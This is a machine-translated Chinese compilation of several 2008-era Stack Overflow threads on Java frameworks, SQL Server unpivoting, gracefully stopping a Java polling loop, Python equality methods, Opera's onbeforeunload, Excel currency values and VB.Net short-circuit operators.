## 回答 #1

> 赞同：2
> 
> 时间：2008-12-23T22:32:00.450

尽管我不太了解“asp.net mvc”的全部内容，但我建议您看看[Spring](http://www.springsource.org/about)可能会很有趣。

一开始可能太复杂了，但是当你得到这个概念时，它变得很容易理解。

Spring 有 5 个核心模块（我记不太清了），但它们就像：

*   AOP
*   甲骨文
*   MVC
*   核
*   （我在这里缺少其他一些）

MVC 部分使用了很多注解来让生活更轻松。Spring 周围有一个非常大的社区。

[这是](http://www.theserverside.com/tt/articles/article.tss?l=SpringFramework)一篇关于春天的介绍性文章。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T22:56:33.833

Java 有大量可供您选择的框架。我用于 Java 开发的技术堆栈是：

国际奥委会的春天。数据层休眠。Struts2 用于 MVC 框架。我还换掉了 spring 并为 IoC 使用了 Guice。

Spring 也有 MVC，但我更喜欢 Struts2。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T23:12:34.783

我建议看一下 Grails，它可以让您熟悉所有 Java 库和框架，如 Spring、SpringMVC、Hibernate、SiteMesh 等，但它为您提供了更好的 Web 应用程序 DSL 和更简洁的 Groovy 代码语言（将其视为具有动态类型、块、闭包等的 Java）。

如果您宁愿坚持使用纯 Java，我建议您查看 Stripes 框架和以下书籍：

[http://pragprog.com/titles/fdstr/stripes](http://pragprog.com/titles/fdstr/stripes)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T22:51:51.003

如果您特别对 Web 应用程序感兴趣，我建议您使用 MyEclipse [http://www.myeclipseide.com](http://www.myeclipseide.com)。基本上，这是一个具有所有 Web 服务器集成和内置功能的 eclipse 版本。我已经使用它几年了，它比普通的 eclipse 更容易开发。根据您要使用多少，您必须决定 55 美元的年度订阅对您来说是否值得。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-23T22:51:53.200

我有点困惑。Spring框架实际上是一个成熟的框架吗？Java不是已经有框架了吗？（通过框架我指的是所有那些杂项库）。

# sql - 将单个记录（行）显示为单个列

> ID：390238
> 
> 赞同：0
> 
> 时间：2008-12-23T22:25:22.770
> 
> 标签：sql, sql-server, sql-server-2005, pivot

我正在寻找将单行数据显示为单列（多行）的方法。例如，

```
场A场B
-------- ---------
1 一些文本 [行]

标头值 [col]
------ ------
字段A 1 [row1]
FieldB SomeText [row2]

```

有没有办法用 SQL Server 2005 做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-23T22:31:31.247

是的，有一个 TSQL 命令，PIVOT。关于这个主题有几个现有的线程；但我不能随便找到一个。

我通常的回答（可能是这些线程中的 5 或 6 个）是考虑在适当的情况下使用 Excel 或 Access - 这是向最终用户提供价值的一种非常简单的方法。但是YMMV。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-23T23:08:37.613

您可以使用[此处解释的unpivot](http://wiki.lessthandot.com/index.php/Column_To_Row_(UNPIVOT))

```
Declare @tbl Table
(
  c1 int,
  c2 int,
  c3 int
)

Insert into @tbl Values(1,2,3)

Select
  cname,
  cval
From
  (
    Select C1,C2,C3 From @tbl
  ) t
UNPIVOT
  (Cval For Cname In
    (C1,C2,C3)
  )As U 
```

但它通常不灵活且缓慢。您可以使用联合，但在维护方面通常更差，但可能很快（需要检查）或使用动态查询和联合

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T22:34:00.897

另一种简单的方法：

从表中选择“FieldA”，将 FieldA 作为值并从表中
选择
“FieldB”，将 FieldB 作为值

但是枢轴确实是您想要尝试的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-23T22:39:54.600

像其他几个响应所建议的那样，使用 T-SQL PIVOT 命令。

如果您有权访问 SQL Server Reporting Services，您也​​可以根据您的简单查询创建报告并使用矩阵报告控件。将您的字段拖放到控件上，您就完成了！

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-01-23T10:09:37.093

如果您正在寻找特定的东西，即不是通用解决方案，而是为您的特定数据库量身定制的解决方案，那么您可以执行以下操作：

```
select Field1+';'+convert(nvarchar(255), Field2 )+';'+convert(nvarchar(255),Field3 ) from Table 
```

使用对 nvarchar(255) 的转换，这样无论其中包含什么字符，您都不会遇到问题，请记住在运行 select 之前修复排序规则（否则您永远不知道您的 orderby 和 groupby 会发生什么）。

# java - Java while 循环和线程！

> ID：390242
> 
> 赞同：14
> 
> 时间：2008-12-23T22:26:50.040
> 
> 标签：java, multithreading, while-loop

我有一个程序可以不断地轮询数据库以了解某些字段的值的变化。它在后台运行，当前使用 while(true) 和 sleep() 方法来设置间隔。我想知道这是否是一个好习惯？而且，有什么更有效的方法来实现这一点？该程序旨在始终运行。

因此，停止程序的唯一方法是在进程 ID 上发出终止命令。该程序可能处于 JDBC 调用的中间。我怎样才能更优雅地终止它？我知道最好的选择是通过使用将由线程定期检查的标志来设计某种退出策略。但是，我想不出改变这个标志值的方法/条件。有任何想法吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-12-23T22:37:59.640

> 我想知道这是否是一个好习惯？

不，这不好。有时，这就是你所拥有的一切，但这并不好。

> 而且，有什么更有效的方法来实现这一点？

首先，事物是如何进入数据库的？

最好的更改是修复插入/更新数据库的程序，以向数据库和您的程序发出请求。JMS 主题非常适合这种事情。

下一个最佳更改是向数据库添加一个触发器，以将每个插入/更新事件排入队列。该队列可以提供一个 JMS 主题（或队列）以供您的程序处理。

后备计划是您的轮询循环。

但是，您的轮询循环不应该轻而易举地工作。它应该将消息放入队列中，以供其他一些 JDBC 进程处理。终止请求是可以放入 JMS 队列的另一条消息。当您的程序收到终止消息时，它绝对必须完成之前的 JDBC 请求，并且可以优雅地停止。

在执行任何这些操作之前，请查看 ESB 解决方案。Sun 的[JCAPS](http://www.sun.com/software/javaenterprisesystem/javacaps/index.jsp)或[TIBCO](http://www.tibco.com/)已经具备此功能。[像Mulesource](http://www.mulesource.org/display/MULE/Home)或[Jitterbit](http://www.jitterbit.com/)这样的开源 ESB可能已经构建并测试了此功能。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-12-23T22:30:32.013

这确实是一个太大的问题，无法以这种格式完全回答。帮自己一个忙，去购买[Java Concurrency in Practice](https://rads.stackoverflow.com/amzn/click/com/0321349601)吧。在 Java 5+ 平台上没有更好的并发资源。有**整章**专门讨论这个主题。

关于在 JDBC 调用期间终止进程的主题，应该没问题。我相信中断 JDBC 调用存在问题（因为你不能？）但这是一个不同的问题。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-24T04:14:18.013

正如其他人所说，您必须进行轮询的事实可能表明您的系统设计存在更深层次的问题......但有时就是这样，所以......

如果你想更优雅地处理“杀死”进程，你可以安装一个关闭钩子，当你点击`Ctrl`+时调用它`C`：

```
volatile boolean stop = false;

Runtime.getRuntime().addShutdownHook(new Thread("shutdown thread") {

    public void run() {

        stop = true;
    }
}); 
```

然后定期检查停止变量。

更优雅的解决方案是等待事件：

```
boolean stop = false;

final Object event = new Object();

Runtime.getRuntime().addShutdownHook(new Thread("shutdown thread") {

    public void run() {

        synchronized(event) {

            stop = true;
            event.notifyAll();
        }
    }
});

// ... and in your polling loop ...
synchronized(event) {

    while(!stop) {

        // ... do JDBC access ...
        try {

            // Wait 30 seconds, but break out as soon as the event is fired.
            event.wait(30000);
        }

        catch(InterruptedException e) {

            // Log a message and exit. Never ignore interrupted exception.
            break;
        }
    }
} 
```

或类似的东西。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-23T22:57:30.537

请注意，计时器（或类似的）会更好，因为您至少可以重用它并让它处理睡眠、调度、异常处理等所有细节......

您的应用程序可能会死掉的原因有很多。不要只关注一个。

如果理论上你的 JDBC 工作有可能让事情处于半正确的状态，那么你就有了一个应该修复的错误。您所有的数据库工作都应该在一个事务中。它应该去或不去。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-23T23:12:00.743

这是Java。将您的处理移至第二个线程。现在你可以

*   在循环中从标准输入读取。如果有人键入“QUIT”，则将 while 标志设置为 false 并退出。
*   使用 STOP 按钮创建 AWT 或 Swing 框架。
*   假装你是一个 Unix 守护进程并创建一个服务器套接字。等待有人打开套接字并发送“QUIT”。（这有一个额外的好处，您可以将睡眠更改为带有超时的选择。）

这必须有数百种变体。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-23T22:30:55.460

为 SIGTERM 设置一个信号处理程序，该处理程序设置一个标志，告诉您的循环下次退出它。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-23T22:59:23.547

关于“程序可能处于 JDBC 调用中间。我怎样才能更优雅地终止它？”的问题。- 请参阅[如何中止正在运行的 jdbc 事务？](https://stackoverflow.com/questions/295920/how-can-i-abort-a-running-jdbc-transaction)

请注意，使用带有 sleep() 的轮询很少是正确的解决方案 - 实施不当，最终可能会占用 CPU 资源（JVM 线程调度程序最终会花费过多的时间来休眠和唤醒线程）。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-23T22:40:32.630

如果那是您的应用程序并且您可以修改它，您可以：

*   让它读取文件
*   读取标志的值。
*   当你想杀死它时，你只需修改文件，应用程序就会优雅地退出。

不需要那么努力地工作。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-23T23:47:38.690

我在当前公司的实用程序库中为这些类型的问题创建了一个服务类：

```
public class Service implements Runnable {

    private boolean shouldStop = false;

    public synchronized stop() {
        shouldStop = true;
        notify();
    }

    private synchronized shouldStop() {
        return shouldStop;
    }

    public void run() {
        setUp();
        while (!shouldStop()) {
            doStuff();
            sleep(60 * 1000);
        }
    }

    private synchronized sleep(long delay) {
        try {
            wait(delay);
        } catch (InterruptedException ie1) {
            /* ignore. */
        }
    }

} 
```

当然，这还远未完成，但您应该了解要点。这将使您能够`stop()`在希望程序停止时简单地调用该方法，并且它将干净地退出。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-12-24T05:00:46.763

您可以使该字段成为包含（概念上）进程 ID 和时间戳的复合值。[更好的是，使用两个或更多字段。] 在拥有对该字段的访问权限的进程中启动一个线程，并让它循环、休眠并更新时间戳。然后等待拥有对该字段的访问权限的轮询进程可以观察到时间戳在某个时间 T 内没有更新（这比更新循环的睡眠间隔的时间大得多）并假设先前拥有的进程已经死亡.

但这仍然容易失败。

在其他语言中，我总是尝试使用flock() 调用来同步文件。不确定Java等价物是什么。如果可能的话，获得真正的并发性。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-04-09T11:19:13.373

我很惊讶没有人提到用 Java 实现的中断机制。它应该是解决停止线程问题的方法。所有其他解决方案都至少有一个缺陷，这就是为什么需要在 Java 并发库中实现这种机制的原因。

您可以通过向线程发送中断() 消息来停止线程，但是还有其他方式可以中断线程。发生这种情况时会抛出 InterruptedException。这就是为什么在调用 sleep() 时必须处理它的原因。在那里您可以进行清理并优雅地结束，例如关闭数据库连接。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2017-08-11T17:09:33.797

我认为你应该用 timertask 来轮询它。

我的计算机在 10 秒内运行了 1075566 次 while 循环。那是 107557 次在一秒钟内。

真正需要多久进行一次轮询？TimerTask 在 1 秒内以最快的速度运行 1000 次。你给它一个 int （毫秒）的参数作为参数。如果您对此感到满意 - 这意味着您在执行该任务时对 CPU 的压力会减少 108 倍。

如果您对每秒轮询一次感到满意，那就是 (108 * 1000)。减少 108 000 倍的压力。这也意味着您可以使用与您的一个 while 循环相同的 cpu 应变检查 108 000 个值 - 因为您不会经常分配您的 cpu 进行检查。记住 cpu 有一个时钟周期。我的是 3 600 000 000 赫兹（每秒周期）。

如果您的目标是为用户更新它 - 您可以在用户每次登录时运行检查（或手动让他要求更新） - 这实际上不会对 CPU 造成任何压力。

您还可以使用`thread.sleep(miliseconds);`来降低您的轮询线程的压力（因为它不会经常轮询）您在做什么。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2017-08-11T19:13:27.100

Java9 对此有另一个“潜在”的答案：[Thread.onSpinWait()](http://download.java.net/java/jdk9/docs/api/java/lang/Thread.html#onSpinWait--)：

> 表示调用者暂时无法继续，直到其他活动发生一个或多个动作。通过在自旋等待循环构造的每次迭代中调用此方法，调用线程向运行时指示它正忙于等待。运行时可能会采取措施来提高调用自旋等待循环构造的性能。

有关详细信息，请参阅[JEP 285 。](http://openjdk.java.net/jeps/285)

# python - 在 Python 类中支持等价（“平等”）的优雅方式

> ID：390250
> 
> 赞同：495
> 
> 时间：2008-12-23T22:30:52.590
> 
> 标签：python, equality, equivalence

在编写自定义类时，通过`==`and`!=`运算符允许等价通常很重要。在 Python 中，这可以通过分别实现`__eq__`和`__ne__`特殊方法来实现。我发现最简单的方法是以下方法：

```
class Foo:
    def __init__(self, item):
        self.item = item

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.__dict__ == other.__dict__
        else:
            return False

    def __ne__(self, other):
        return not self.__eq__(other) 
```

你知道这样做的更优雅的方法吗？您知道使用上述比较`__dict__`s 的方法有什么特别的缺点吗？

**注意**：澄清一下——当`__eq__`和`__ne__`未定义时，你会发现这种行为：

```
>>> a = Foo(1)
>>> b = Foo(1)
>>> a is b
False
>>> a == b
False 
```

也就是说，因为它确实运行，所以`a == b`评估为身份测试（即，“与 相同的对象吗？”）。`False``a is b``a``b`

当`__eq__`和`__ne__`被定义时，你会发现这种行为（这是我们所追求的）：

```
>>> a = Foo(1)
>>> b = Foo(1)
>>> a is b
False
>>> a == b
True 
```

* * *

## 回答 #1

> 赞同：417
> 
> 时间：2014-08-07T07:24:42.003

考虑这个简单的问题：

```
class Number:

    def __init__(self, number):
        self.number = number

n1 = Number(1)
n2 = Number(1)

n1 == n2 # False -- oops 
```

因此，Python 默认使用对象标识符进行比较操作：

```
id(n1) # 140400634555856
id(n2) # 140400634555920 
```

覆盖该`__eq__`函数似乎可以解决问题：

```
def __eq__(self, other):
    """Overrides the default implementation"""
    if isinstance(other, Number):
        return self.number == other.number
    return False

n1 == n2 # True
n1 != n2 # True in Python 2 -- oops, False in Python 3 
```

在*Python 2*中，请始终记住也要覆盖该`__ne__`函数，如[文档](https://docs.python.org/2.7/reference/datamodel.html#object.__ne__)所述：

> 比较运算符之间没有隐含的关系。的真理`x==y`并不意味着它`x!=y`是错误的。因此，在定义 时`__eq__()`，还应该定义`__ne__()`操作符的行为与预期一致。

```
def __ne__(self, other):
    """Overrides the default implementation (unnecessary in Python 3)"""
    return not self.__eq__(other)

n1 == n2 # True
n1 != n2 # False 
```

在*Python 3*中，这不再是必要的，正如[文档](https://docs.python.org/3/reference/datamodel.html#object.__ne__)所述：

> 默认情况下，`__ne__()`委托`__eq__()`并反转结果，除非它是`NotImplemented`. 比较运算符之间没有其他隐含关系，例如，真值`(x<y or x==y)`不隐含`x<=y`。

但这并不能解决我们所有的问题。让我们添加一个子类：

```
class SubNumber(Number):
    pass

n3 = SubNumber(1)

n1 == n3 # False for classic-style classes -- oops, True for new-style classes
n3 == n1 # True
n1 != n3 # True for classic-style classes -- oops, False for new-style classes
n3 != n1 # False 
```

**注意：** Python 2 有两种类：

*   *[经典风格](https://docs.python.org/2/reference/datamodel.html#new-style-and-classic-classes)*（或*旧风格*）类，*不*继承自`object`声明为`class A:`，`class A():`或者`class A(B):`哪里`B`是经典风格类；

*   *[新式](https://docs.python.org/2/reference/datamodel.html#new-style-and-classic-classes)*类，继承自`object`并声明为`class A(object)`或`class A(B):`在哪里`B`是新式类。`class A:`Python 3 仅具有声明为、`class A(object):`或的新型类`class A(B):`。

对于经典风格的类，比较操作总是调用第一个操作数的方法，而对于新风格的类，它总是调用子类操作数的方法，[而不管操作数的顺序如何](https://stackoverflow.com/a/12984987/78234)。

所以在这里，if`Number`是一个经典风格的类：

*   `n1 == n3`来电`n1.__eq__`；
*   `n3 == n1`来电`n3.__eq__`；
*   `n1 != n3`来电`n1.__ne__`；
*   `n3 != n1`来电`n3.__ne__`。

如果`Number`是新式类：

*   两者`n1 == n3`都`n3 == n1`调用`n3.__eq__`；
*   两者`n1 != n3`都`n3 != n1`打电话`n3.__ne__`。

为了解决Python 2 经典样式类的`==`and运算符的非交换性问题，and方法应该在不支持操作数类型时返回值。该[文档](https://docs.python.org/2.7/reference/datamodel.html#the-standard-type-hierarchy)将值定义为：`!=``__eq__``__ne__``NotImplemented``NotImplemented`

> 如果数值方法和富比较方法没有实现对提供的操作数的操作，则它们可能会返回此值。（然后解释器将尝试反射操作或其他一些回退操作，具体取决于操作员。）其真值为真。

在这种情况下，运算符将比较操作委托给另一个*操作数的**反射方法*。该[文档](https://docs.python.org/2.7/reference/datamodel.html#object.__lt__)将反射方法定义为：

 *> 这些方法没有交换参数版本（当左参数不支持操作但右参数支持时使用）；更确切地说，`__lt__()`和`__gt__()`是彼此的反映，`__le__()`并且`__ge__()`是彼此的反映， `__eq__()`并且`__ne__()`是自己的反映。

结果如下所示：

```
def __eq__(self, other):
    """Overrides the default implementation"""
    if isinstance(other, Number):
        return self.number == other.number
    return NotImplemented

def __ne__(self, other):
    """Overrides the default implementation (unnecessary in Python 3)"""
    x = self.__eq__(other)
    if x is NotImplemented:
        return NotImplemented
    return not x 
```

如果操作数是不相关类型（无继承）时需要and运算符的*可交换*性，即使对于新型类，返回`NotImplemented`值而不是也是正确的做法。`False`*`==``!=`*

 *我们到了吗？不完全的。我们有多少个独特的数字？

```
len(set([n1, n2, n3])) # 3 -- oops 
```

集合使用对象的哈希值，默认情况下 Python 返回对象标识符的哈希值。让我们尝试覆盖它：

```
def __hash__(self):
    """Overrides the default implementation"""
    return hash(tuple(sorted(self.__dict__.items())))

len(set([n1, n2, n3])) # 1 
```

最终结果如下所示（我在最后添加了一些断言进行验证）：

```
class Number:

    def __init__(self, number):
        self.number = number

    def __eq__(self, other):
        """Overrides the default implementation"""
        if isinstance(other, Number):
            return self.number == other.number
        return NotImplemented

    def __ne__(self, other):
        """Overrides the default implementation (unnecessary in Python 3)"""
        x = self.__eq__(other)
        if x is not NotImplemented:
            return not x
        return NotImplemented

    def __hash__(self):
        """Overrides the default implementation"""
        return hash(tuple(sorted(self.__dict__.items())))

class SubNumber(Number):
    pass

n1 = Number(1)
n2 = Number(1)
n3 = SubNumber(1)
n4 = SubNumber(4)

assert n1 == n2
assert n2 == n1
assert not n1 != n2
assert not n2 != n1

assert n1 == n3
assert n3 == n1
assert not n1 != n3
assert not n3 != n1

assert not n1 == n4
assert not n4 == n1
assert n1 != n4
assert n4 != n1

assert len(set([n1, n2, n3, ])) == 1
assert len(set([n1, n2, n3, n4])) == 2 
```

* * *

## 回答 #2

> 赞同：220
> 
> 时间：2008-12-24T02:30:13.353

您需要小心继承：

```
>>> class Foo:
    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self.__dict__ == other.__dict__
        else:
            return False

>>> class Bar(Foo):pass

>>> b = Bar()
>>> f = Foo()
>>> f == b
True
>>> b == f
False 
```

更严格地检查类型，如下所示：

```
def __eq__(self, other):
    if type(other) is type(self):
        return self.__dict__ == other.__dict__
    return False 
```

除此之外，您的方法可以正常工作，这就是特殊方法的用途。

* * *

## 回答 #3

> 赞同：162
> 
> 时间：2008-12-24T00:44:13.270

你描述的方式是我一直这样做的方式。由于它是完全通用的，因此您始终可以将该功能分解为一个 mixin 类，并在您想要该功能的类中继承它。

```
class CommonEqualityMixin(object):

    def __eq__(self, other):
        return (isinstance(other, self.__class__)
            and self.__dict__ == other.__dict__)

    def __ne__(self, other):
        return not self.__eq__(other)

class Foo(CommonEqualityMixin):

    def __init__(self, item):
        self.item = item 
```

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2012-09-19T12:19:09.897

不是一个直接的答案，但似乎足够相关，可以附加，因为它有时会节省一些冗长的乏味。直接从文档中删除...

* * *

[functools.total_ordering(cls)](http://docs.python.org/library/functools.html#functools.total_ordering)

**给定一个定义一个或多个丰富的比较排序方法的类，这个类装饰器提供其余的。**这简化了指定所有可能的丰富比较操作所涉及的工作：

该类必须定义`__lt__()`、`__le__()`、`__gt__()`或之一`__ge__()`。此外，该类应该提供一个`__eq__()`方法。

2.7 版中的新功能

```
@total_ordering
class Student:
    def __eq__(self, other):
        return ((self.lastname.lower(), self.firstname.lower()) ==
                (other.lastname.lower(), other.firstname.lower()))
    def __lt__(self, other):
        return ((self.lastname.lower(), self.firstname.lower()) <
                (other.lastname.lower(), other.firstname.lower())) 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2008-12-23T22:44:26.430

您不必同时覆盖两者`__eq__`，`__ne__`您只能覆盖`__cmp__`，但这将对 ==、!==、<、> 等的结果产生影响。

`is`测试对象身份。这意味着 a `is`b 将出现`True`在 a 和 b 都持有对同一对象的引用的情况下。在 python 中，您总是在变量中保存对对象的引用，而不是实际对象，因此基本上对于 a is b 来说，它们中的对象应该位于相同的内存位置。你如何以及最重要的是为什么要覆盖这种行为？

编辑：我不知道`__cmp__`从 python 3 中删除了所以避免它。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2015-06-17T00:30:12.723

从这个答案：[https](https://stackoverflow.com/a/30676267/541136) ://stackoverflow.com/a/30676267/541136我已经证明了这一点，虽然`__ne__`用术语定义是正确的`__eq__`- 而不是

```
def __ne__(self, other):
    return not self.__eq__(other) 
```

你应该使用：

```
def __ne__(self, other):
    return not self == other 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-12-23T23:12:07.920

我认为您正在寻找的两个术语是**平等**(==) 和**身份**(is)。例如：

```
>>> a = [1,2,3]
>>> b = [1,2,3]
>>> a == b
True       <-- a and b have values which are equal
>>> a is b
False      <-- a and b are not the same list object 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2008-12-24T02:55:28.950

'is' 测试将使用内置的 'id()' 函数测试身份，该函数本质上返回对象的内存地址，因此不可重载。

但是，在测试类的相等性的情况下，您可能希望对测试更加严格，并且只比较类中的数据属性：

```
import types

class ComparesNicely(object):

    def __eq__(self, other):
        for key, value in self.__dict__.iteritems():
            if (isinstance(value, types.FunctionType) or 
                    key.startswith("__")):
                continue

            if key not in other.__dict__:
                return False

            if other.__dict__[key] != value:
                return False

         return True 
```

此代码将仅比较您的类的非函数数据成员，并跳过通常是您想要的任何私有数据。在普通旧 Python 对象的情况下，我有一个实现 __init__、__str__、__repr__ 和 __eq__ 的基类，因此我的 POPO 对象不会承担所有额外（并且在大多数情况下相同）逻辑的负担。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2019-03-15T11:47:55.363

我喜欢使用通用类装饰器，而不是使用子类化/混合

```
def comparable(cls):
    """ Class decorator providing generic comparison functionality """

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__

    def __ne__(self, other):
        return not self.__eq__(other)

    cls.__eq__ = __eq__
    cls.__ne__ = __ne__
    return cls 
```

用法：

```
@comparable
class Number(object):
    def __init__(self, x):
        self.x = x

a = Number(1)
b = Number(1)
assert a == b 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2019-10-31T03:05:32.290

这包含了对 Algorias 答案的评论，并通过单个属性比较对象，因为我不关心整个 dict。`hasattr(other, "id")`一定是真的，但我知道这是因为我在构造函数中设置了它。

```
def __eq__(self, other):
    if other is self:
        return True

    if type(other) is not type(self):
        # delegate to superclass
        return NotImplemented

    return other.id == self.id 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2021-07-03T03:17:01.847

我写了一个自定义基础，它的默认实现`__ne__`简单地否定了`__eq__`：

```
class HasEq(object):
  """
  Mixin that provides a default implementation of ``object.__neq__`` using the subclass's implementation of ``object.__eq__``.

  This overcomes Python's deficiency of ``==`` and ``!=`` not being symmetric when overloading comparison operators
  (i.e. ``not x == y`` *does not* imply that ``x != y``), so whenever you implement
  `object.__eq__ <https://docs.python.org/2/reference/datamodel.html#object.__eq__>`_, it is expected that you
  also implement `object.__ne__ <https://docs.python.org/2/reference/datamodel.html#object.__ne__>`_

  NOTE: in Python 3+ this is no longer necessary (see https://docs.python.org/3/reference/datamodel.html#object.__ne__)
  """

  def __ne__(self, other):
    """
    Default implementation of ``object.__ne__(self, other)``, delegating to ``self.__eq__(self, other)``.

    When overriding ``object.__eq__`` in Python, one should also override ``object.__ne__`` to ensure that
    ``not x == y`` is the same as ``x != y``
    (see `object.__eq__ <https://docs.python.org/2/reference/datamodel.html#object.__eq__>`_ spec)

    :return: ``NotImplemented`` if ``self.__eq__(other)`` returns ``NotImplemented``, otherwise ``not self.__eq__(other)``
    """
    equal = self.__eq__(other)
    # the above result could be either True, False, or NotImplemented
    if equal is NotImplemented:
      return NotImplemented
    return not equal 
```

如果你从这个基类继承，你只需要实现`__eq__`和基类。

回想起来，更好的方法可能是将其实现为装饰器。就像是[`@functools.total_ordering`](https://docs.python.org/2.7/library/functools.html#functools.total_ordering)

# javascript - Opera中的onbeforeunload

> ID：390260
> 
> 赞同：12
> 
> 时间：2008-12-23T22:35:50.427
> 
> 标签：javascript, events, opera, onbeforeunload

我正在使用 netadictos 在[此处](https://stackoverflow.com/questions/333665/)发布到问题的代码。我要做的就是在用户离开或关闭窗口/选项卡时显示警告。

netadictos 发布的代码似乎在 IE7、FF 3.0.5、Safari 3.2.1 和 Chrome 中运行良好，但在 Opera v9.63 中不起作用。有谁知道在 Opera 中做同样的事情的方式？

谢谢，特雷夫

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2010-12-22T12:19:05.017

Opera 目前不支持 window.onbeforeunload。它将在未来的某些版本中得到支持，但从 Opera 11 开始还没有足够高的优先级来实现。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-03T15:59:37.203

`onbeforeunload`现在在基于 WebKit 引擎的 Opera 15 中得到支持，但在任何基于 Presto 的早期版本中都不支持。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T22:58:39.287

你试过这个吗？

```
history.navigationMode = 'compatible'; 
```

[参考](http://www.opera.com/support/kb/view/827/)，通过[此页面找到](http://www.quirksmode.org/bugreports/archives/2004/11/load_and_unload.html)

我自己还没有真正尝试过，但它看起来很有希望。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-12T04:35:06.763

移动 Safari (iPhone/iPad) 也不支持 onbeforeunload，我强烈怀疑不太可能。

对于检测后退/前进导航，可能有一些解决方法，例如，请参阅[在移动 safari 中使用 onbeforeunload 的替代方法吗？](https://stackoverflow.com/questions/6205989/is-there-an-alternative-method-to-use-onbeforeunload-in-mobile-safari).

# python - 解释 Excel 货币值

> ID：390263
> 
> 赞同：1
> 
> 时间：2008-12-23T22:37:51.123
> 
> 标签：python, excel, pywin32

我正在使用 python 从 excel 中读取货币值。range.Value 方法返回的是一个我不知道如何解析的元组。

例如，单元格显示为 $548,982，但在 python 中，该值返回为 (1, 1194857614)。

如何从 excel 中获取数值或如何将此元组值转换为数值？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T09:19:13.747

试试这个：

```
import struct
try: import decimal
except ImportError:
    divisor= 10000.0
else:
    divisor= decimal.Decimal(10000)

def xl_money(i1, i2):
    byte8= struct.unpack(">q", struct.pack(">ii", i1, i2))[0]
    return byte8 / divisor

>>> xl_money(1, 1194857614)
Decimal("548982.491") 
```

Microsoft COM 中的 Money 是一个 8 字节的整数；它是定点，有 4 位小数（即 1 用 10000 表示）。我的函数的作用是获取 4 字节整数的元组，使用 struct 生成一个 8 字节整数以避免任何符号问题，然后除以常量 10000。如果可用，该函数使用 decimal.Decimal，否则使用漂浮。

更新（基于评论）：到目前为止，只有 COM 货币值作为两个整数元组返回，因此您可能需要检查这一点，但不能保证这将始终成功。但是，根据您使用的库及其版本，很可能稍后，在一些升级之后，您将收到`decimal.Decimal`s 而不是两个整数元组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T22:54:07.177

我用 Excel 2007 和 VBA 试过这个。它给出了正确的值。

1) 尝试将此值粘贴到新的 Excel 工作簿中
2) 按 Alt + F11。带您进入 VBA 编辑器。
3) 按 Ctrl + G。让您进入即时窗口。
4) 在即时窗口中，键入 ?cells("a1").Value
这里“a1”是您粘贴值的单元格。

我怀疑该单元格是否具有某种价值或特征，因此它会以这种方式进行解释。

在这里发表你的观察。

# asp.net - 检查字符串是否为空，然后检查 1 行中的某个值？

> ID：390265
> 
> 赞同：1
> 
> 时间：2008-12-23T22:38:03.340
> 
> 标签：asp.net, vb.net, string

我似乎总是在查看一个字符串（通常是查询字符串值）是否有一个值，但首先我必须先检查它是否不是空的，所以我最终得到 2 个 if then 语句 - 我在这里错过了什么 - 必须有一个更好的这样做的方法：

```
If Not String.IsNullOrEmpty(myString) Then
  If CBool(myString) Then
   //code
   End If
End If 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-23T22:50:41.253

在 VB.Net 中， And 不会短路，但[AndAlso](http://msdn.microsoft.com/en-us/library/cb8x3kfz(VS.80).aspx)会。

（对于 Or 和 OrElse 相同）

所以你的代码应该看起来像

```
If Not String.IsNullOrEmpty(myString) AndAlso CBool(myString) Then 
    ....
End If 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-23T22:41:42.317

您选择的语言中的布尔“和”运算符？条件通常会短路，因此如果第一个失败，第二个将不会运行/出错。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T23:57:09.327

AndAlso（如前所述）是最通用的答案。但是，您也可以使用各种 TryParse 方法，这将使代码如下所示：

```
Dim b as Boolean
If Boolean.TryParse(myString, b) AndAlso b Then
End If 
```

奖励，当有人在您的查询字符串中发送“blah”时，它会将您从 FormatException 中解救出来。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T23:20:06.810

仅供参考，这种类型的代码非常适合作为“扩展方法”。简而言之，这意味着您可以使用提供您自己的代码的方法来扩展字符串。

查一下：）

* * *

## 回答 #5

